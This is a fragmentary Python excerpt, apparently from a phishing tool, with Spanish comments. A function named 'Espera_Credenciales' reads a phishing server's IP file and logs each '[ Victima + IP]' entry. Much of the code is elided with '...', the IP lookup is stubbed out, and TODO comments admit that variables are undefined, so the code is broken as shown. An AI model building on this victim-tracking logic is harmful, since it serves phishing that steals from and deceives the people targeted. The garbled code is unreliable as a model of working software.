...
didBackground = True
logFile = None
argv = ['1','2'] # TODO: ARGV NO ESTA DEFINIDO
for arg in argv:
    if arg=="--nolog":
        didBackground = False
if didBackground:
...
def Espera_Credenciales():
    ...
    with open('Server/www/ip.txt') as creds:
        ...
        if len(lines) != 0:
            ...
            ipinfo = 'No tengo el paquete dejo asi' #TODO: |json.loads(resp.read().decode(resp.info().get_param('charset') or 'utf-8'))
            if 'bogon' in ipinfo:
                log('======================================================================'.format(RED,END)) #TODO: DEFAULT NO ESTA DEFINIDO |DEFAULT))
                log(' \n{0}[ Victima + IP]{1}:\n {0}%s{1}'.format(GREEN, END) % lines) #TODO:DEFAULT NO ESTA DEFINIDO | DEFAULT) % lines)
            else:
